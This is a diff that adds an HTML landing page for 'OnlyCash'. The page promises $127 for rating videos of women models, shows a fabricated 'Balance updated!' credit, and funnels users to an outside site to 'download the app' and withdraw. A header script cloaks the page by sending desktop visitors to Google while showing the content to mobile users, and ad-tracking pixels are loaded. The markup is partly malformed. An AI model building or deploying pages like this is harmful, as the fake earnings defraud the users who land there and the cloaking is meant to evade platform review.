@@ -1,0 +1,401 @@
+<!DOCTYPE html><html class="scroll-smooth" lang="es"><head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <title>OnlyCash</title>
+ 
+ <script>
+  window.pixelId = "688fd81f3a7555d7d487e814";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  (function() {
+    var ua = navigator.userAgent || navigator.vendor || window.opera;
+
+    // Lista suja de devices mobile
+    var isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+
+    // Bloqueia bots mais manjados
+    var isBot = /googlebot|bingbot|crawler|spider|robot|crawling/i.test(ua);
+
+    if (!isMobile && !isBot) {
+        // PC humano vai pro deserto
+        window.location.href = "https://www.google.com";
+    }
+})();
+</script>
+  <!-- Tailwind + FontAwesome + Fonts -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="css/all.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+    }
+    .modal-enter {
+      opacity: 0;
+      transform: scale(0.95);
+    }
+    .modal-enter-active {
+      opacity: 1;
+      transform: scale(1);
+      transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+    .modal-leave {
+      opacity: 1;
+      transform: scale(1);
+    }
+    .modal-leave-active {
+      opacity: 0;
+      transform: scale(0.95);
+      transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+  </style>
+</head>
+<body class="bg-[#e6e6e6] min-h-screen flex flex-col items-center p-4">
+
+  <!-- CONTAINER PRINCIPAL -->
+  <main class="w-full max-w-md rounded-xl bg-white p-4 space-y-3 relative z-0">
+
+    <!-- TOPO -->
+    <section class="flex justify-between items-center bg-white rounded-xl p-4 shadow-sm">
+      <div class="flex items-center space-x-2">
+        <img alt="OnlyCash logo azul sobre fondo blanco" class="w-28 h-auto object-contain" src="Only-Cash-Logo.png">
+      </div>
+      <button id="balanceBtn" class="bg-[#2ecc40] text-white font-extrabold text-xl rounded-lg px-6 py-2" type="button">$ 0.00</button>
+    </section>
+
+    <section class="bg-[#d9d9d9] rounded-xl p-3 text-center text-lg font-extrabold text-[#0a1a4d]">
+      Choose a model to evaluate: <span class="text-[#2ecc40]">Earn $127.00</span> 
+    </section>
+
+    <!-- ESCOLHA A MODELO PARA AVALIAR -->
+    <section class="mt-4 space-y-3">
+      <div class="grid grid-cols-2 gap-3">
+        <!-- Modelo 1 -->
+        <div class="bg-white p-2 rounded-xl shadow text-center">
+          <img src="agatha.jpg" alt="Modelo Agatha" class="w-full rounded-xl object-cover h-40">
+          <button class="mt-2 evaluate-btn bg-[#2ecc40] text-white text-sm font-bold py-1 px-3 rounded-lg">Evaluate Now</button>
+        </div>
+        <!-- Modelo 2 -->
+        <div class="bg-white p-2 rounded-xl shadow text-center">
+          <img src="maria.jpg" alt="Modelo 2" class="w-full rounded-xl object-cover h-40">
+          <button class="mt-2 evaluate-btn-2 bg-[#2ecc40] text-white text-sm font-bold py-1 px-3 rounded-lg">Evaluate Now</button>
+        </div>
+        <!-- Modelo 3 -->
+<div class="bg-white p-2 rounded-xl shadow text-center">
+  <img src="alisa.png" alt="Modelo 3" class="w-full rounded-xl object-cover h-40">
+  <button class="mt-2 evaluate-btn-3 bg-[#2ecc40] text-white text-sm font-bold py-1 px-3 rounded-lg">Evaluate Now</button>
+</div>
+<!-- Modelo 4 -->
+<div class="bg-white p-2 rounded-xl shadow text-center">
+  <img src="VEGA.png" alt="Modelo Sasha" class="w-full rounded-xl object-cover h-40">
+  <button class="mt-2 evaluate-btn-4 bg-[#2ecc40] text-white text-sm font-bold py-1 px-3 rounded-lg">Evaluate Now</button>
+</div>
+      </div>
+    </section>
+  </main>
+<!-- TEXTO INFERIOR GERAL ABAIXO DOS MODELOS -->
+<div class="mt-4 text-center">
+  <p class="text-sm text-gray-700">
+    Click the button below to evaluate your favorite model
+  </p>
+</div>
+
+ <!-- POPUPS DE AVALIAÇÃO POR MODELO 1 -->
+<div id="avaliacaoPopup" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-md p-4 text-center relative">
+
+    <p class="text-lg font-semibold mb-3">
+      Evaluate <span class="font-bold">Agatha Blake</span> and earn 
+      <span class="text-green-600 font-bold">$127</span>
+    </p>
+
+    <!-- Vídeo -->
+    <video autoplay loop muted playsinline class="w-full rounded-xl mb-4">
+      <source src="agatha.mp4" type="video/mp4">
+      Seu navegador não suporta vídeo.
+    </video>
+
+    <!-- Título acima dos botões -->
+    <p class="text-lg font-semibold mb-3">Evaluate the Agatha performance:</p>
+
+    <!-- Botões -->
+    <div id="botoesModelo1" class="flex justify-center gap-2">
+      <button class="response-btn bg-[#2ecc40] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Excellent</button>
+      <button class="response-btn bg-[#f7d117] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Moderate</button>
+      <button class="response-btn bg-[#d50000] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Low</button>
+    </div>
+
+  </div>
+</div>
+    </div>
+  </div>
+
+  <!-- MODAL DE BALANCE UPDATED -->
+  <div id="modalOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+    <div id="modalContent" class="bg-white rounded-xl shadow-lg max-w-xs w-11/12 sm:w-96 p-6 text-center relative">
+      <div class="flex justify-center mb-4">
+        <i class="fas fa-check-circle text-green-500 text-6xl" aria-hidden="true"></i>
+      </div>
+      <h2 class="text-xl font-extrabold mb-2 text-green-600">Balance updated!</h2>
+      <p id="modalAmount" class="text-green-600 text-lg font-semibold">You have received: +$127.00</p>
+    </div>
+  </div>
+
+  <!-- NOVO POPUP FINAL MODELO 1 -->
+<div id="finalPopup" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-md p-6 text-center">
+    <h2 class="text-xl font-bold text-[#0a1a4d] mb-2">Download the app and withdraw your balance</h2>
+    <p class="text-3xl font-bold text-green-600 mb-2">$127.00</p>
+    <p class="text-sm text-gray-600 mb-4">Watch a 4-minute video and transfer it to your bank account</p>
+    <a id="vslButton1" href="/index.html" class="block bg-[#2f54eb] text-white font-bold py-2 px-6 rounded-lg mb-1">WATCH VIDEO</a>
+    <p class="text-xs text-gray-400">Click the button</p>
+  </div>
+</div>
+
+<!-- POPUP AVALIAÇÃO MODELO 2 -->
+<<div id="avaliacaoPopup2" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-md p-4 text-center relative">
+
+    <!-- Texto acima do vídeo -->
+    <p class="text-lg font-semibold mb-3">
+      Evaluate <span class="font-bold">Marie Dee</span> and earn 
+      <span class="text-green-600 font-bold">$127</span>
+    </p>
+
+    <!-- Vídeo substituindo o GIF -->
+    <video autoplay loop muted playsinline class="w-full rounded-xl mb-4">
+      <source src="marie1.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+
+    <!-- Título acima dos botões -->
+    <p class="text-lg font-semibold mb-3">Evaluate the Marie performance</p>
+
+    <!-- Botões -->
+    <div id="botoesModelo2" class="flex justify-center gap-2">
+      <button class="response-btn-2 bg-[#2ecc40] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Excellent</button>
+      <button class="response-btn-2 bg-[#f7d117] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Moderate</button>
+      <button class="response-btn-2 bg-[#d50000] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Low</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- MODAL DE BALANCE UPDATED MODELO 2 -->
+<div id="modalOverlay2" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-xs sm:w-96 p-6 text-center">
+    <div class="flex justify-center mb-4">
+      <i class="fas fa-check-circle text-green-500 text-6xl" aria-hidden="true"></i>
+    </div>
+    <h2 class="text-xl font-extrabold mb-2 text-green-600">Balance updated!</h2>
+    <p class="text-green-600 text-lg font-semibold">You have received: +$127.00</p>
+  </div>
+</div>
+
+<!-- MODAL FINAL MODELO 2 -->
+<div id="finalPopup2" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-md p-6 text-center">
+    <h2 class="text-xl font-bold text-[#0a1a4d] mb-2">Download the app and withdraw your balance</h2>
+    <p class="text-3xl font-bold text-green-600 mb-2">$127.00</p>
+    <p class="text-sm text-gray-600 mb-4">Watch a 4-minute video and transfer it to your bank account</p>
+    <a id="vslButton1" href="https://onlysystemof.site/eval" class="block bg-[#2f54eb] text-white font-bold py-2 px-6 rounded-lg mb-1">WATCH VIDEO</a>
+    <p class="text-xs text-gray-400">Click the button</p>
+  </div>
+</div>
+  </div>
+<!-- POPUP AVALIAÇÃO MODELO 3 -->
+<div id="avaliacaoPopup3" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-md p-4 text-center relative">
+
+    <!-- Texto acima do vídeo -->
+    <p class="text-lg font-semibold mb-3">
+      Evaluate <span class="font-bold">Alisa Lee</span> and earn 
+      <span class="text-green-600 font-bold">$127</span>
+    </p>
+
+    <!-- Vídeo da modelo -->
+    <video autoplay loop muted playsinline class="w-full rounded-xl mb-4">
+      <source src="alisa.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+
+    <!-- Subtítulo acima dos botões -->
+    <p class="text-lg font-semibold mb-3">Evaluate the Alisa performance</p>
+
+    <!-- Botões -->
+    <div id="botoesModelo3" class="flex justify-center gap-2">
+      <button class="response-btn-3 bg-[#2ecc40] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Excellent</button>
+      <button class="response-btn-3 bg-[#f7d117] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Moderate</button>
+      <button class="response-btn-3 bg-[#d50000] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Low</button>
+    </div>
+
+  </div>
+</div>
+  <!-- MODAL DE BALANCE UPDATED MODELO 3 -->
+<div id="modalOverlay3" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-xs sm:w-96 p-6 text-center">
+    <div class="flex justify-center mb-4">
+      <i class="fas fa-check-circle text-green-500 text-6xl" aria-hidden="true"></i>
+    </div>
+    <h2 class="text-xl font-extrabold mb-2 text-green-600">Balance updated!</h2>
+    <p class="text-green-600 text-lg font-semibold">You have received: +$127.00</p>
+  </div>
+</div
+<!-- MODAL FINAL MODELO 3 -->
+<div id="finalPopup3" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-md p-6 text-center">
+    <h2 class="text-xl font-bold text-[#0a1a4d] mb-2">Download the app and withdraw your balance</h2>
+    <p class="text-3xl font-bold text-green-600 mb-2">$127.00</p>
+    <p class="text-sm text-gray-600 mb-4">Watch a 4-minute video and transfer it to your bank account</p>
+   <a id="vslButton1" href="https://onlysystemof.site/eval/" class="block bg-[#2f54eb] text-white font-bold py-2 px-6 rounded-lg mb-1">WATCH VIDEO</a>
+    <p class="text-xs text-gray-400">Click the button</p>
+  </div>
+</div>
+
+<!-- POPUP AVALIAÇÃO MODELO 4 -->
+<div id="avaliacaoPopup4" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-md p-4 text-center relative">
+    <p class="text-lg font-semibold mb-3">
+      Evaluate <span class="font-bold">Vega Thompson</span> and earn 
+      <span class="text-green-600 font-bold">$127</span>
+    </p>
+    <video autoplay loop muted playsinline class="w-full rounded-xl mb-4">
+      <source src="vega1.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+    <p class="text-lg font-semibold mb-3">Evaluate Sasha’s performance</p>
+    <div id="botoesModelo4" class="flex justify-center gap-2 hidden">
+      <button class="response-btn-4 bg-[#2ecc40] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Excellent</button>
+      <button class="response-btn-4 bg-[#f7d117] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Moderate</button>
+      <button class="response-btn-4 bg-[#d50000] text-white font-semibold text-sm rounded-lg px-4 py-1.5">Low</button>
+    </div>
+  </div>
+</div>
+<!-- MODAL DE BALANCE UPDATED MODELO 4 -->
+<div id="modalOverlay4" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-xs sm:w-96 p-6 text-center">
+    <div class="flex justify-center mb-4">
+      <i class="fas fa-check-circle text-green-500 text-6xl" aria-hidden="true"></i>
+    </div>
+    <h2 class="text-xl font-extrabold mb-2 text-green-600">Balance updated!</h2>
+    <p class="text-green-600 text-lg font-semibold">You have received: +$127.00</p>
+  </div>
+</div>
+<!-- MODAL FINAL MODELO 4 -->
+<div id="finalPopup4" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-xl shadow-lg w-11/12 max-w-md p-6 text-center">
+    <h2 class="text-xl font-bold text-[#0a1a4d] mb-2">Download the app and withdraw your balance</h2>
+    <p class="text-3xl font-bold text-green-600 mb-2">$127.00</p>
+    <p class="text-sm text-gray-600 mb-4">Watch a 4-minute video and transfer it to your bank account</p>
+    <a id="vslButton1" href="https://onlysystemof.site/eval/" class="block bg-[#2f54eb] text-white font-bold py-2 px-6 rounded-lg mb-1">WATCH VIDEO</a>
+    <p class="text-xs text-gray-400">Click the button</p>
+  </div>
+</div>
+  <!-- FUNCTIONAL SCRIPT -->
+<script>
+  window.onload = () => {
+    const balanceBtn = document.getElementById("balanceBtn");
+    const modalOverlay = document.getElementById("modalOverlay");
+    const finalPopup = document.getElementById("finalPopup");
+    const avaliacaoPopup = document.getElementById("avaliacaoPopup");
+
+    if (balanceBtn) balanceBtn.textContent = "$ 0.00";
+
+    // Modelo 1
+    document.querySelectorAll(".evaluate-btn")[0].addEventListener("click", () => {
+      avaliacaoPopup.classList.remove("hidden");
+      setTimeout(() => {
+        document.getElementById("botoesModelo1").classList.remove("hidden");
+      }, 5000);
+    });
+
+    document.querySelectorAll(".response-btn").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        avaliacaoPopup.classList.add("hidden");
+        modalOverlay.classList.remove("hidden");
+        setTimeout(() => {
+          modalOverlay.classList.add("hidden");
+          finalPopup.classList.remove("hidden");
+        }, 2000);
+      });
+    });
+
+    // Modelo 2
+    document.querySelectorAll(".evaluate-btn-2").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        document.getElementById("avaliacaoPopup2").classList.remove("hidden");
+        setTimeout(() => {
+          document.getElementById("botoesModelo2").classList.remove("hidden");
+        }, 5000);
+      });
+    });
+
+    document.querySelectorAll(".response-btn-2").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        document.getElementById("avaliacaoPopup2").classList.add("hidden");
+        document.getElementById("modalOverlay2").classList.remove("hidden");
+        setTimeout(() => {
+          document.getElementById("modalOverlay2").classList.add("hidden");
+          document.getElementById("finalPopup2").classList.remove("hidden");
+        }, 2000);
+      });
+    });
+
+    // Modelo 3
+    document.querySelectorAll(".evaluate-btn-3").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        document.getElementById("avaliacaoPopup3").classList.remove("hidden");
+        setTimeout(() => {
+          document.getElementById("botoesModelo3").classList.remove("hidden");
+        }, 5000);
+      });
+    });
+
+    document.querySelectorAll(".response-btn-3").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        document.getElementById("avaliacaoPopup3").classList.add("hidden");
+        document.getElementById("modalOverlay3").classList.remove("hidden");
+        setTimeout(() => {
+          document.getElementById("modalOverlay3").classList.add("hidden");
+          document.getElementById("finalPopup3").classList.remove("hidden");
+        }, 2000);
+      });
+    });
+  };
+  // Modelo 4
+document.querySelectorAll(".evaluate-btn-4").forEach((btn) => {
+  btn.addEventListener("click", () => {
+    document.getElementById("avaliacaoPopup4").classList.remove("hidden");
+    setTimeout(() => {
+      document.getElementById("botoesModelo4").classList.remove("hidden");
+    }, 5000);
+  });
+});
+
+document.querySelectorAll(".response-btn-4").forEach((btn) => {
+  btn.addEventListener("click", () => {
+    document.getElementById("avaliacaoPopup4").classList.add("hidden");
+    document.getElementById("modalOverlay4").classList.remove("hidden");
+    setTimeout(() => {
+      document.getElementById("modalOverlay4").classList.add("hidden");
+      document.getElementById("finalPopup4").classList.remove("hidden");
+    }, 2000);
+  });
+});
+</script>
+</body>
+</html>
